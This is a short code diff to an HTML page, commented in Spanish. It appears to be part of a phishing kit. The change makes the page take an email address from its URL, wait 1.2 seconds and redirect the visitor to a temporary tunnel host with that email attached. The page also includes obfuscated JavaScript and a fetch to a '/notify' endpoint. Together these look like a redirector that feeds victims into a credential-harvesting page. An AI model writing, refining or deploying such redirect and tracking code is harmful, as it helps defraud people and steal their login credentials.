@@ -7,7 +7,7 @@
   <style>
     body {
       margin: 0;
-      background-color: #fff; /* Fondo blanco */
+      background-color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -31,19 +31,22 @@ const AoHuGCPK=YnVvdMlsYVL;(function(dOjNl,AqkWECDzqbOGRwDQ$Qk){const b$SaHdKZEC
 
   </script>
   <script>
-    // 👉 Aquí defines o capturas el email.
-    // Puedes pedirlo con prompt() o asignarlo.
-    const email = "usuario@ejemplo.com"; // Pruébalo fijo, o reemplaza con prompt()
+    // ✅ 1) Tomar el email de la URL actual
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get("email");
 
-    // Espera 1.2 segundos y redirige PASANDO el email por la URL.
+    // ✅ 2) Redirigir con el email a la URL final
     setTimeout(function() {
       const destino = "https://2mtkvpjqh.localto.net/hdm"; // Tu página final
-      window.location.href = `${destino}?email=${encodeURIComponent(email)}`;
+      if (email) {
+        window.location.href = `${destino}?email=${encodeURIComponent(email)}`;
+      } else {
+        window.location.href = destino; // fallback si no hay email
+      }
     }, 1200);
   </script>
 
   <script>
-    // Opcional: tu otro fetch (lo dejé tal cual)
     fetch('/notify');
   </script>
 </head>
